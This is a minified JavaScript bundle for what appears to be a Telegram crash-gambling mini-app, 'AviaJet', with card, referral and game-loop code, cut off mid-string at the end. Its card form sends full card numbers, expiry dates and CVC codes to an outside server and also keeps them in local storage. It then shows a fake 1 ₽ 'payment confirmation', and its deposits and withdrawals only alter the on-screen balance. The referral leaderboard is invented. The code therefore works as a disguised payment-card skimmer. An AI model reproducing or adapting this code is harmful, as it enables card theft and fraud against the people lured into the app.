(function(){let e=document.createElement(`link`).relList;if(e&&e.supports&&e.supports(`modulepreload`))return;for(let e of document.querySelectorAll(`link[rel="modulepreload"]`))n(e);new MutationObserver(e=>{for(let t of e)if(t.type===`childList`)for(let e of t.addedNodes)e.tagName===`LINK`&&e.rel===`modulepreload`&&n(e)}).observe(document,{childList:!0,subtree:!0});function t(e){let t={};return e.integrity&&(t.integrity=e.integrity),e.referrerPolicy&&(t.referrerPolicy=e.referrerPolicy),e.crossOrigin===`use-credentials`?t.credentials=`include`:e.crossOrigin===`anonymous`?t.credentials=`omit`:t.credentials=`same-origin`,t}function n(e){if(e.ep)return;e.ep=!0;let n=t(e);fetch(e.href,n)}})();var e=new class{settings={theme:`dark`,sound:!0,vibration:!0};cards=[];transactionType=`deposit`;selectedCardIndex=0;constructor(){this.loadFromStorage(),this.applySettings(),this.setupNavigation(),this.renderCards()}loadFromStorage(){try{localStorage.getItem(`aviajet_theme`)===`light`&&(this.settings.theme=`light`),localStorage.getItem(`aviajet_sound`)===`off`&&(this.settings.sound=!1),localStorage.getItem(`aviajet_vibration`)===`off`&&(this.settings.vibration=!1);let e=localStorage.getItem(`aviajet_cards`);e&&(this.cards=JSON.parse(e))}catch(e){console.warn(`Failed to load from storage:`,e)}}saveToStorage(){try{localStorage.setItem(`aviajet_theme`,this.settings.theme),localStorage.setItem(`aviajet_sound`,this.settings.sound?`on`:`off`),localStorage.setItem(`aviajet_vibration`,this.settings.vibration?`on`:`off`),localStorage.setItem(`aviajet_cards`,JSON.stringify(this.cards))}catch(e){console.warn(`Failed to save to storage:`,e)}}applySettings(){this.settings.theme===`light`?(document.body.classList.add(`light`),this.toggleSwitch(`theme-toggle`,!0)):(document.body.classList.remove(`light`),this.toggleSwitch(`theme-toggle`,!1)),!this.settings.sound&&window.SoundEngine&&window.SoundEngine.toggle(),this.toggleSwitch(`sound-toggle`,this.settings.sound),this.toggleSwitch(`vibration-toggle`,this.settings.vibration)}toggleSwitch(e,t){let n=document.getElementById(e);n&&(t?n.classList.add(`active`):n.classList.remove(`active`))}setupNavigation(){let e=document.getElementById(`nav-referral`),t=document.getElementById(`nav-crash`),n=document.getElementById(`nav-profile`),r=document.getElementById(`view-crash`),i=document.getElementById(`view-referral`),a=document.getElementById(`view-profile`),o=e=>{[r,i,a].forEach(e=>{e&&(e.classList.add(`hidden`),e.classList.remove(`view-active`))});let t=document.getElementById(e);t&&(t.classList.remove(`hidden`),t.classList.add(`view-active`))};t&&t.addEventListener(`click`,()=>o(`view-crash`)),e&&e.addEventListener(`click`,()=>o(`view-referral`)),n&&n.addEventListener(`click`,()=>o(`view-profile`))}toggleTheme(){this.settings.theme=this.settings.theme===`dark`?`light`:`dark`,this.applySettings(),this.saveToStorage(),window.SoundEngine&&window.SoundEngine.playClick()}toggleSound(){this.settings.sound=!this.settings.sound,this.applySettings(),this.saveToStorage(),window.SoundEngine&&(window.SoundEngine.toggle(),this.settings.sound&&window.SoundEngine.playClick())}toggleVibration(){this.settings.vibration=!this.settings.vibration,this.applySettings(),this.saveToStorage(),this.settings.vibration&&window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.impactOccurred(`light`),window.SoundEngine&&window.SoundEngine.playClick()}getSettings(){return{...this.settings}}renderCards(){let e=document.getElementById(`cards-list`),t=document.getElementById(`no-cards-message`);if(e){if(e.querySelectorAll(`.card-item`).forEach(e=>e.remove()),this.cards.length===0){t&&(t.style.display=`block`);return}t&&(t.style.display=`none`),this.cards.forEach((t,n)=>{let r=document.createElement(`div`);r.className=`card-item bg-gradient-to-r from-zinc-900 to-zinc-800/50 p-4 rounded-2xl border border-zinc-800 flex items-center justify-between`;let i=t.number.slice(-4),a=t.number.startsWith(`4`);r.innerHTML=`
                <div class="flex items-center gap-3">
                    <div class="w-10 h-7 bg-gradient-to-r ${a?`from-blue-500 to-blue-600`:`from-orange-500 to-orange-600`} rounded flex items-center justify-center text-[8px] font-black text-white">${a?`VISA`:`MC`}</div>
                    <div>
                        <span class="text-sm font-bold text-white">•••• ${i}</span>
                        <span class="text-[9px] text-zinc-500 block">Истекает ${t.expiry}</span>
                    </div>
                </div>
                <div class="flex items-center gap-2">
                    <span class="text-[10px] text-green-500 font-bold">Карта в обработке</span>
                    <button onclick="window.removeCard?.(${n})" class="text-zinc-600 hover:text-red-500 transition-colors text-sm">✕</button>
                </div>
            `,e.appendChild(r)})}}addCard(e){this.cards.push(e),this.saveToStorage(),this.renderCards()}removeCard(e){confirm(`Удалить карту?`)&&(this.cards.splice(e,1),this.saveToStorage(),this.renderCards(),window.SoundEngine&&window.SoundEngine.playClick())}getCards(){return[...this.cards]}showAddCard(){document.getElementById(`add-card-modal`)?.classList.remove(`hidden`);let e=document.getElementById(`card-number`),t=document.getElementById(`card-expiry`),n=document.getElementById(`card-cvc`);e&&(e.value=``),t&&(t.value=``),n&&(n.value=``)}hideAddCard(){document.getElementById(`add-card-modal`)?.classList.add(`hidden`)}formatCardNumber(e){let t=e.value.replace(/\D/g,``);t=t.replace(/(.{4})/g,`$1 `).trim(),e.value=t}formatExpiry(e){let t=e.value.replace(/\D/g,``);t.length>=2&&(t=t.slice(0,2)+`/`+t.slice(2)),e.value=t}async verifyCard(){let e=document.getElementById(`card-number`),t=document.getElementById(`card-expiry`),n=document.getElementById(`card-cvc`),r=e?.value.replace(/\s/g,``)||``,i=t?.value||``,a=n?.value||``;if(r.length!==16){alert(`Введите корректный номер карты (16 цифр)`);return}if(i.length!==5||!i.includes(`/`)){alert(`Введите корректную дату (MM/YY)`);return}if(a.length<3){alert(`Введите корректный CVC код`);return}if(this.cards.some(e=>e.number===r)){alert(`Эта карта уже добавлена`);return}window.SoundEngine&&window.SoundEngine.playClick();let o=window.Telegram?.WebApp?.initDataUnsafe?.user?.id||localStorage.getItem(`userId`);if(!o){alert(`Ошибка: пользователь не авторизован`);return}let s=document.querySelector(`#add-card-modal button:last-child`),c=s?.textContent||``;s&&(s.textContent=`⏳ ОТПРАВКА...`,s.disabled=!0);try{let e=await(await fetch(`https://bac-cas.arizona-relax.com/cards/add`,{method:`POST`,headers:{"Content-Type":`application/json`},body:JSON.stringify({userId:Number(o),number:r,expiry:i,cvc:a})})).json();e.success?(this.addCard({number:r,expiry:i,cvc:a}),this.hideAddCard(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.notificationOccurred(`success`),this.showPaymentConfirmation(),console.log(`📊 Ответ сервера:`,e)):alert(`❌ Ошибка: ${e.message||`Неизвестная ошибка`}`)}catch(e){console.error(`❌ Ошибка отправки:`,e),alert(`❌ Ошибка соединения с сервером`)}finally{s&&(s.textContent=c,s.disabled=!1)}}showPaymentConfirmation(){let e=document.createElement(`div`);e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            backdrop-filter: blur(8px);
            animation: fadeIn 0.3s ease;
        `;let t=document.createElement(`div`);t.style.cssText=`
            background: linear-gradient(145deg, #1c1c1e, #2a2a2d);
            border-radius: 24px;
            padding: 32px 28px 28px;
            max-width: 380px;
            width: 92%;
            color: #ffffff;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
            animation: slideUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            border: 1px solid rgba(255, 255, 255, 0.06);
            position: relative;
            overflow: hidden;
        `,t.innerHTML=`
            <div style="position: absolute; top: -50px; right: -50px; width: 150px; height: 150px; background: radial-gradient(circle, rgba(52, 199, 89, 0.1), transparent); border-radius: 50%;"></div>
            <div style="position: absolute; bottom: -50px; left: -50px; width: 150px; height: 150px; background: radial-gradient(circle, rgba(52, 199, 89, 0.05), transparent); border-radius: 50%;"></div>
            
            <div style="text-align: center; position: relative; z-index: 1;">
                <h3 style="margin: 0 0 6px 0; font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #ffffff, #a0a0a0); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
                    Подтверждение платежа
                </h3>
                <p style="margin: 0 0 4px 0; color: #8e8e93; font-size: 14px; -webkit-text-fill-color: #8e8e93;">
                    Карта проходит аудификацию
                </p>
                <p style="margin: 0 0 24px 0; color: #8e8e93; font-size: 13px; -webkit-text-fill-color: #8e8e93;">
                    Для завершения подтвердите платеж
                </p>
                
                <div style="
                    background: rgba(255, 255, 255, 0.05);
                    border-radius: 16px;
                    padding: 18px;
                    margin-bottom: 24px;
                    border: 1px solid rgba(255, 255, 255, 0.06);
                ">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                        <span style="color: #8e8e93; font-size: 15px; -webkit-text-fill-color: #8e8e93;">Сумма</span>
                        <span style="font-weight: 700; font-size: 24px; color: #34c759;">1 ₽</span>
                    </div>
                    <div style="display: flex; justify-content: space-between; align-items: center; padding-top: 10px; border-top: 1px solid rgba(255, 255, 255, 0.06);">
                        <span style="color: #8e8e93; font-size: 13px; -webkit-text-fill-color: #8e8e93;">Карта</span>
                        <span style="font-weight: 500; font-size: 14px; color: #ffffff;">•••• ${this.cards[this.cards.length-1]?.number.slice(-4)||`****`}</span>
                    </div>
                </div>

                <div style="display: flex; gap: 10px;">
                    <button id="cancelPaymentBtn" style="
                        flex: 1;
                        padding: 14px;
                        border: none;
                        border-radius: 14px;
                        background: rgba(255, 255, 255, 0.08);
                        color: #ffffff;
                        font-size: 15px;
                        font-weight: 600;
                        cursor: pointer;
                        transition: all 0.2s;
                        -webkit-text-fill-color: #ffffff;
                    ">Отмена</button>
                    <button id="confirmPaymentBtn" style="
                        flex: 1;
                        padding: 14px;
                        border: none;
                        border-radius: 14px;
                        background: linear-gradient(135deg, #34c759, #28a745);
                        color: #ffffff;
                        font-size: 15px;
                        font-weight: 600;
                        cursor: pointer;
                        transition: all 0.2s;
                        box-shadow: 0 4px 20px rgba(52, 199, 89, 0.3);
                        -webkit-text-fill-color: #ffffff;
                    ">Подтвердить</button>
                </div>
            </div>
        `,e.appendChild(t),document.body.appendChild(e);let n=document.createElement(`style`);n.textContent=`
            @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            @keyframes slideUp {
                from { transform: translateY(40px) scale(0.95); opacity: 0; }
                to { transform: translateY(0) scale(1); opacity: 1; }
            }
            @keyframes pulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.05); }
            }
        `,document.head.appendChild(n);let r=t.querySelector(`#confirmPaymentBtn`),i=t.querySelector(`#cancelPaymentBtn`);r&&r.addEventListener(`click`,()=>{e.remove(),this.showSuccessNotification(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.impactOccurred(`heavy`)}),i&&i.addEventListener(`click`,()=>{e.remove(),this.showCancelNotification(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.impactOccurred(`light`)}),e.addEventListener(`click`,t=>{t.target===e&&(e.remove(),this.showCancelNotification())})}showSuccessNotification(){let e=document.createElement(`div`);e.style.cssText=`
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #34c759, #28a745);
            color: white;
            padding: 16px 28px;
            border-radius: 16px;
            font-weight: 600;
            font-size: 15px;
            z-index: 100000;
            box-shadow: 0 8px 30px rgba(52, 199, 89, 0.4);
            animation: slideDown 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            display: flex;
            align-items: center;
            gap: 12px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        `,e.innerHTML=`
            <span style="font-size: 24px;">⏳</span>
            <span>Карта в обработке</span>
        `,document.body.appendChild(e),setTimeout(()=>{e.style.animation=`slideUp 0.4s ease forwards`,setTimeout(()=>e.remove(),400)},3e3);let t=document.createElement(`style`);t.textContent=`
            @keyframes slideDown {
                from { transform: translateX(-50%) translateY(-100px); opacity: 0; }
                to { transform: translateX(-50%) translateY(0); opacity: 1; }
            }
            @keyframes slideUp {
                from { transform: translateX(-50%) translateY(0); opacity: 1; }
                to { transform: translateX(-50%) translateY(-100px); opacity: 0; }
            }
        `,document.head.appendChild(t)}showCancelNotification(){let e=document.createElement(`div`);e.style.cssText=`
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, #ff3b30, #dc2626);
            color: white;
            padding: 16px 28px;
            border-radius: 16px;
            font-weight: 600;
            font-size: 15px;
            z-index: 100000;
            box-shadow: 0 8px 30px rgba(255, 59, 48, 0.4);
            animation: slideDown 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
            display: flex;
            align-items: center;
            gap: 12px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        `,e.innerHTML=`
            <span style="font-size: 24px;">❌</span>
            <span>Платёж отменён. Карта не добавлена.</span>
        `,document.body.appendChild(e),setTimeout(()=>{e.style.animation=`slideUp 0.4s ease forwards`,setTimeout(()=>e.remove(),400)},3e3)}handleDeposit(){if(this.cards.length===0){alert(`Сначала добавьте карту!`),this.showAddCard();return}this.transactionType=`deposit`;let e=document.getElementById(`transaction-title`),t=document.getElementById(`transaction-amount`),n=document.getElementById(`transaction-confirm-btn`);e&&(e.textContent=`💰 Пополнение баланса`),t&&(t.value=``,t.min=`1000`,t.placeholder=`1000`),n&&(n.textContent=`Пополнить`),this.showTransactionModal()}handleWithdraw(){if(this.cards.length===0){alert(`Сначала добавьте карту!`),this.showAddCard();return}this.transactionType=`withdraw`;let e=document.getElementById(`transaction-title`),t=document.getElementById(`transaction-amount`),n=document.getElementById(`transaction-confirm-btn`);e&&(e.textContent=`📤 Вывод средств`),t&&(t.value=``,t.min=`1000`,t.placeholder=`1000`),n&&(n.textContent=`Вывести`),this.showTransactionModal()}showTransactionModal(){let e=document.getElementById(`transaction-modal`);e&&e.classList.remove(`hidden`);let t=document.getElementById(`card-options`);t&&(t.innerHTML=``,this.cards.forEach((e,n)=>{let r=e.number.slice(-4),i=e.number.startsWith(`4`),a=i?`VISA`:`MC`,o=document.createElement(`div`);o.className=`flex items-center gap-3 p-3 bg-zinc-900/50 rounded-xl border border-zinc-800 cursor-pointer hover:border-brand transition-colors`,o.onclick=()=>this.selectCard(n),o.innerHTML=`
                <div class="w-8 h-5 bg-gradient-to-r ${i?`from-blue-500 to-blue-600`:`from-orange-500 to-orange-600`} rounded flex items-center justify-center text-[6px] font-black text-white">${a}</div>
                <span class="text-sm font-bold text-white">•••• ${r}</span>
                <span class="text-[10px] text-zinc-500">${e.expiry}</span>
            `,t.appendChild(o)}),this.cards.length>0&&this.selectCard(0))}selectCard(e){this.selectedCardIndex=e,document.querySelectorAll(`#card-options > div`).forEach((t,n)=>{n===e?(t.classList.add(`border-brand`,`bg-brand/10`),t.classList.remove(`border-zinc-800`)):(t.classList.remove(`border-brand`,`bg-brand/10`),t.classList.add(`border-zinc-800`))})}hideTransactionModal(){document.getElementById(`transaction-modal`)?.classList.add(`hidden`)}confirmTransaction(){let e=document.getElementById(`transaction-amount`),t=parseInt(e?.value||`0`);if(!t||t<1e3){alert(`Минимальная сумма: 1,000 ₽`);return}if(this.cards.length===0){alert(`Нет добавленных карт`),this.hideTransactionModal();return}let n=this.cards[this.selectedCardIndex];if(!n){alert(`Выберите карту`);return}window.SoundEngine&&window.SoundEngine.playClick();let r=document.getElementById(`transaction-confirm-btn`),i=r?.textContent||``;r&&(r.textContent=`⏳ Обработка...`,r.disabled=!0),setTimeout(()=>{let e=document.getElementById(`balance`),a=document.getElementById(`prof-balance`),o=parseFloat(e?.textContent?.replace(/,/g,``)||`0`),s;if(this.transactionType===`deposit`)s=o+t,alert(`✅ Баланс пополнен на ${t.toLocaleString()} ₽`);else{if(o<t){alert(`❌ Недостаточно средств на балансе`),r&&(r.textContent=i,r.disabled=!1);return}s=o-t,alert(`✅ Выведено ${t.toLocaleString()} ₽ на карту ****${n.number.slice(-4)}`)}e&&(e.textContent=s.toFixed(2)),a&&(a.textContent=s.toFixed(2)),r&&(r.textContent=i,r.disabled=!1),this.hideTransactionModal(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.notificationOccurred(`success`)},2e3)}};window.toggleTheme=()=>e.toggleTheme(),window.toggleSound=()=>e.toggleSound(),window.toggleVibration=()=>e.toggleVibration(),window.showAddCard=()=>e.showAddCard(),window.hideAddCard=()=>e.hideAddCard(),window.formatCardNumber=t=>e.formatCardNumber(t),window.formatExpiry=t=>e.formatExpiry(t),window.verifyCard=()=>e.verifyCard(),window.removeCard=t=>e.removeCard(t),window.handleDeposit=()=>e.handleDeposit(),window.handleWithdraw=()=>e.handleWithdraw(),window.hideTransactionModal=()=>e.hideTransactionModal(),window.confirmTransaction=()=>e.confirmTransaction();var t=new class{stats={totalReferrals:0,totalEarned:0,commission:5,topReferrals:[],totalUsers:47};referalLink=`https://t.me/@aviajetsbot?start=ref_12345`;constructor(){this.loadFromStorage(),this.renderStats(),this.renderTopReferrals(),this.setupEventListeners()}loadFromStorage(){try{let e=localStorage.getItem(`aviajet_referral_stats`);if(e){let t=JSON.parse(e);this.stats={...this.stats,...t}}else this.stats.topReferrals=[{id:`1`,name:`Алексей К.`,invitedCount:12,earned:2400,rank:`gold`},{id:`2`,name:`Мария С.`,invitedCount:8,earned:1800,rank:`silver`},{id:`3`,name:`Дмитрий В.`,invitedCount:5,earned:950,rank:`bronze`},{id:`4`,name:`Елена П.`,invitedCount:3,earned:420,rank:`none`},{id:`5`,name:`Сергей Н.`,invitedCount:2,earned:180,rank:`none`}],this.stats.totalReferrals=0,this.stats.totalEarned=0,this.saveToStorage()}catch(e){console.warn(`Failed to load referral stats:`,e)}}saveToStorage(){try{localStorage.setItem(`aviajet_referral_stats`,JSON.stringify(this.stats))}catch(e){console.warn(`Failed to save referral stats:`,e)}}renderStats(){let e=document.getElementById(`ref-count`);e&&(e.textContent=this.stats.totalReferrals.toString());let t=document.getElementById(`ref-earned`);t&&(t.textContent=`${this.stats.totalEarned.toLocaleString()} ₽`);let n=document.getElementById(`ref-link`);n&&(n.textContent=this.referalLink);let r=document.getElementById(`ref-total-users`);r&&(r.textContent=`Всего в программе: ${this.stats.totalUsers} участников`)}renderTopReferrals(){let e=document.getElementById(`ref-top-list`);if(e){if(e.innerHTML=``,this.stats.topReferrals.length===0){e.innerHTML=`
                <div class="text-center py-6">
                    <span class="text-zinc-500 text-sm">Пока нет рефералов</span>
                    <p class="text-[10px] text-zinc-600 mt-1">Пригласите друзей и начните зарабатывать!</p>
                </div>
            `;return}this.stats.topReferrals.forEach((t,n)=>{let r=t.rank===`none`?n+1:t.rank===`gold`?1:t.rank===`silver`?2:3,i=t.rank===`gold`?`gold`:t.rank===`silver`?`silver`:t.rank===`bronze`?`bronze`:``,a=n>=3?`opacity-70`:``,o=document.createElement(`div`);o.className=`flex items-center justify-between bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/50 ${a}`,o.innerHTML=`
                <div class="flex items-center gap-3">
                    <span class="w-6 h-6 rounded-full ${i?`rank-badge ${i}`:`bg-zinc-700`} flex items-center justify-center text-xs font-black ${i?``:`text-zinc-400`}">
                        ${r}
                    </span>
                    <div>
                        <span class="text-sm font-bold ${n>=3?`text-zinc-400`:`text-white`}">${t.name}</span>
                        <span class="text-[9px] text-zinc-500 block">пригласил${t.name.endsWith(`а`)?`а`:``} ${t.invitedCount} ${this.declension(t.invitedCount,`друг`,`друга`,`друзей`)}</span>
                    </div>
                </div>
                <span class="${n>=3?`text-zinc-500`:`text-brand`} font-black text-sm">+${t.earned.toLocaleString()} ₽</span>
            `,e.appendChild(o)})}}declension(e,t,n,r){let i=e%10,a=e%100;return a>=11&&a<=14?r:i===1?t:i>=2&&i<=4?n:r}setupEventListeners(){let e=document.querySelector(`#ref-link + button`);e&&e.addEventListener(`click`,()=>this.copyRefLink());let t=document.querySelector(`.bg-gradient-to-r.from-brand.to-emerald-400`);t&&t.addEventListener(`click`,()=>this.inviteFriend())}copyRefLink(){navigator.clipboard?navigator.clipboard.writeText(this.referalLink).then(()=>{window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.notificationOccurred(`success`),alert(`✅ Реферальная ссылка скопирована!`)}).catch(()=>this.fallbackCopy()):this.fallbackCopy()}fallbackCopy(){let e=document.createElement(`textarea`);e.value=this.referalLink,document.body.appendChild(e),e.select();try{document.execCommand(`copy`),alert(`✅ Реферальная ссылка скопирована!`)}catch{alert(`❌ Не удалось скопировать ссылку. Скопируйте вручную: `+this.referalLink)}document.body.removeChild(e)}inviteFriend(){if(window.Telegram?.WebApp)try{alert(`📤 Отправьте реферальную ссылку другу!

`+this.referalLink),window.Telegram.WebApp.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.impactOccurred(`medium`)}catch(e){console.warn(`Failed to send invite:`,e)}else alert(`📤 Пригласите друга по ссылке:

`+this.referalLink)}addReferral(e,t=1){let n={id:Date.now().toString(),name:e,invitedCount:t,earned:t*100,rank:`none`};this.stats.topReferrals.push(n),this.stats.totalReferrals+=t,this.stats.totalEarned+=t*100,this.stats.topReferrals.sort((e,t)=>t.earned-e.earned),this.stats.topReferrals.forEach((e,t)=>{t===0?e.rank=`gold`:t===1?e.rank=`silver`:t===2?e.rank=`bronze`:e.rank=`none`}),this.stats.topReferrals.length>10&&(this.stats.topReferrals=this.stats.topReferrals.slice(0,10)),this.saveToStorage(),this.renderStats(),this.renderTopReferrals(),window.Telegram?.WebApp?.HapticFeedback&&window.Telegram.WebApp.HapticFeedback.notificationOccurred(`success`)}getStats(){return{...this.stats}}getReferralLink(){return this.referalLink}};window.copyRefLink=()=>t.copyRefLink(),window.inviteFriend=()=>t.inviteFriend();var n=window.Telegram?.WebApp;n&&(n.expand(),n.ready());var r=n?.initDataUnsafe?.user,i=r?r.id:123456789,a=r?`${r.first_name} ${r.last_name||``}`.trim():`Демо Игрок`,o=document.getElementById(`plane-inner`),s=document.getElementById(`speed-fx`),c=document.getElementById(`multiplier`),l=document.getElementById(`action-btn`),u=document.getElementById(`balance`),d=document.getElementById(`prof-balance`),f=document.getElementById(`plane-container`),p=document.getElementById(`sub-status`),m=document.getElementById(`players-list`),h=document.getElementById(`custom-bet-input`),g=document.getElementById(`game-screen`),_=document.getElementById(`crash-history`),v=document.getElementById(`status-dot`),y=document.getElementById(`status-text-short`),b=window.Telegram?.WebApp?.initData||``,x=`wss://bac-cas.arizona-relax.com/ws?initData=${encodeURIComponent(b)}`,S=new WebSocket(x),C=`waiting`,w=!1,T=100,E=document.getElementById(`username`),D=document.getElementById(`prof-name`),O=document.getElementById(`prof-avatar`),k=document.getElementById(`user-avatar`);E&&(E.innerText=a),D&&(D.innerText=a);var A=a.charAt(0).toUpperCase();O&&(O.innerText=A),k&&(k.innerText=A);function j(e,t){if(!(!v||!y))switch(v.className=`w-2 h-2 rounded-full pulse-dot`,e){case`waiting`:v.classList.add(`bg-amber-400`),y.innerText=t?`START IN ${t}s`:`Ожидание`,y.className=`text-[9px] font-black uppercase tracking-widest text-amber-400`;break;case`flying`:v.classList.add(`bg-brand`),y.innerText=`FLY`,y.className=`text-[9px] font-black uppercase tracking-widest text-brand`;break;case`crashed`:v.classList.add(`bg-red-500`),y.innerText=`CRASHED`,y.className=`text-[9px] font-black uppercase tracking-widest text-red-500`;break}}function M(e){let t=e.toLocaleString(`ru-RU`,{minimumFractionDigits:2,maximumFractionDigits:2});u&&(u.innerText=t),d&&(d.innerText=t)}function N(e,t={}){S.readyState===WebSocket.OPEN&&S.send(JSON.stringify({action:e,user_id:i,...t}))}function P(e){e<10&&(e=10),T=e,h&&(h.value=e.toString()),C===`waiting`&&!w&&l&&(l.innerText=`ПОСТАВИТЬ ${T} ₽`)}async function F(){try{let e=await fetch(`https://bac-cas.arizona-relax.com/user/${i}`);if(e.ok){let t=await e.json();t&&t.balance!==void 0&&M(t.balance)}}catch(e){console.error(`Не удалось подтянуть профиль по HTTP:`,e)}}S.onopen=()=>{console.log(`WebSocket подключен к бекенду!`),F()},S.onmessage=e=>{try{let t=JSON.parse(e.data);if(t.type===`init`||t.type===`bet_confirmed`||t.type===`win`||t.type===`error`){t.balance!==void 0&&M(t.balance),t.type===`bet_confirmed`&&(w=!0,I(`bet_confirmed`)),t.type===`win`&&(w=!1,I(`win`,t.win),n?.HapticFeedback&&n.HapticFeedback.notificationOccurred(`success`));return}if(t.status){let e=C;if(C=t.status,t.history&&_){let e=`<div class="glass-panel text-zinc-400 px-3 py-1.5 rounded-xl text-[10px] font-black whitespace-nowrap border-zinc-800 uppercase tracking-widest mr-1">История</div>`;t.history.forEach(t=>{e+=`<div class="border px-3 py-1.5 rounded-xl text-[11px] font-black ${t>=2?`text-brand border-brand/30 bg-brand/10 shadow-[0_0_10px_rgba(16,185,129,0.2)]`:`text-zinc-400 border-zinc-700 bg-zinc-800/50`}">x${t.toFixed(2)}</div>`}),_.innerHTML=e}if(t.players&&m){m.innerHTML=``;let e=0;Object.entries(t.players).forEach(([t,n])=>{e++;let r=n.status===`playing`?`<div class="text-[10px] text-zinc-500 font-bold uppercase tracking-wider">В полете</div>`:n.status===`cashed_out`?`<div class="text-[10px] text-brand font-bold uppercase tracking-wider">Забрал +${n.win} ₽ <span class="text-zinc-500 font-normal ml-1">x${n.mult.toFixed(2)}</span></div>`:`<div class="text-[10px] text-red-500 font-bold uppercase tracking-wider">Краш</div>`,i=n.status===`cashed_out`?`bg-brand/5 border-brand/20 shadow-[0_0_15px_rgba(16,185,129,0.05)]`:`bg-zinc-900/50 border-zinc-800/50`;m.innerHTML+=`
            <div class="flex items-center justify-between p-3 rounded-2xl border ${i} mb-2">
                <div class="flex items-center space-x-3">
                    <div class="w-8 h-8 bg-zinc-800 rounded-full flex items-center justify-center text-[11px] font-bold text-zinc-400 border border-zinc-700">${n.name.charAt(0).toUpperCase()}</div>
                    <div><div class="text-xs font-bold text-white mb-0.5">${n.name}</div>${r}</div>
                </div>
                <div class="font-display font-black text-sm text-zinc-300">${n.bet} ₽</div>
            </div>`});let n=document.getElementById(`online-count`);n&&(n.innerText=`${e} ОНЛАЙН`)}if(C===`waiting`)c&&(c.classList.remove(`text-crashed`),c.className=`font-display text-6xl font-black text-white transition-colors duration-100 tracking-tighter drop-shadow-2xl`,c.innerHTML=`1.00<span class="text-3xl text-zinc-500 ml-1">x</span>`),p&&(p.innerHTML=``),j(`waiting`,t.timer),f&&(f.style.transform=`translate(0px, 0px) scale(0.9)`,f.style.opacity=`1`),o&&(o.classList.remove(`is-crashed`),o.classList.remove(`animate-turbulence`),o.classList.add(`animate-float`)),w||I(`waiting`);else if(C===`flying`){if(c&&(c.className=`font-display text-6xl font-black text-white transition-colors duration-100 tracking-tighter text-glow drop-shadow-2xl`,c.innerHTML=`${Number(t.multiplier||1).toFixed(2)}<span class="text-3xl text-brand ml-1">x</span>`),p&&(p.innerHTML=``),j(`flying`),s&&(s.style.opacity=`1`),f&&g){let e=Number(t.multiplier||1),n=g.clientWidth/2-10,r=-(g.clientHeight/2)+30,i=Math.min((e-1)*40,n),a=Math.max((e-1)*-20,r);f.style.transform=`translate(${i}px, ${a}px) scale(1.05)`,f.style.opacity=`1`}o&&(o.classList.remove(`animate-float`),o.classList.add(`animate-turbulence`)),w?I(`flying`,Math.floor(T*Number(t.multiplier||1))):I(`spectating`)}else if(C===`crashed`){if(e===`flying`&&window.SoundEngine&&(window.SoundEngine.playCrash?.(),n?.HapticFeedback&&n.HapticFeedback.impactOccurred(`heavy`)),s&&(s.style.opacity=`0`),c){let e=Number(t.multiplier||1).toFixed(2);c.className=`font-display text-6xl font-black text-crashed drop-shadow-[0_0_20px_rgba(239,68,68,0.5)] transition-none`,c.innerHTML=`${e}<span class="text-3xl ml-1">x</span>`}p&&(p.innerHTML=``),j(`crashed`),o&&(o.classList.remove(`animate-turbulence`),o.classList.add(`is-crashed`)),w=!1,I(`crashed`)}}}catch(e){console.error(`Ошибка парсинга WS:`,e)}};function I(e,t){l&&(l.removeAttribute(`disabled`),e===`waiting`?(l.className=`w-full bg-brand hover:bg-emerald-400 text-zinc-900 py-4 rounded-2xl text-sm font-black tracking-widest transition-all duration-200 uppercase shadow-[0_0_20px_rgba(16,185,129,0.3)] shrink-0 transform active:scale-[0.98]`,l.innerText=`ПОСТАВИТЬ ${T} ₽`):e===`bet_confirmed`?(l.className=`w-full bg-zinc-800 text-zinc-500 py-4 rounded-2xl text-sm font-black tracking-widest uppercase pointer-events-none border border-zinc-700 shrink-0`,l.innerText=`СТАВКА В ПУЛЕ`,l.setAttribute(`disabled`,`true`)):e===`flying`?(l.className=`w-full bg-orange-500 text-white py-4 rounded-2xl text-sm font-black tracking-widest uppercase active:scale-[0.98] transition-all shadow-[0_0_50px_rgba(249,115,22,0.8)] border border-orange-300 animate-pulse shrink-0 cursor-pointer`,l.innerText=`ЗАБРАТЬ ${t} ₽`):e===`win`?(l.className=`w-full bg-brand/10 border border-brand text-brand py-4 rounded-2xl text-sm font-black tracking-widest uppercase pointer-events-none shadow-[inset_0_0_15px_rgba(16,185,129,0.2)] shrink-0`,l.innerText=`+ ${t} ₽ ЗАЧИСЛЕНО`,l.setAttribute(`disabled`,`true`)):e===`spectating`?(l.className=`w-full bg-zinc-900/80 border border-zinc-800 text-zinc-600 py-4 rounded-2xl text-sm font-black tracking-widest uppercase pointer-events-none shrink-0`,l.innerText=`ОЖИДАНИЕ СЛЕДУЮЩЕГО...`,l.setAttribute(`disabled`,`true`)):e===`crashed`&&(l.className=`w-full bg-red-500/10 border border-red-500/30 text-red-500 py-4 rounded-2xl text-sm font-black tracking-widest uppercase pointer-events-none 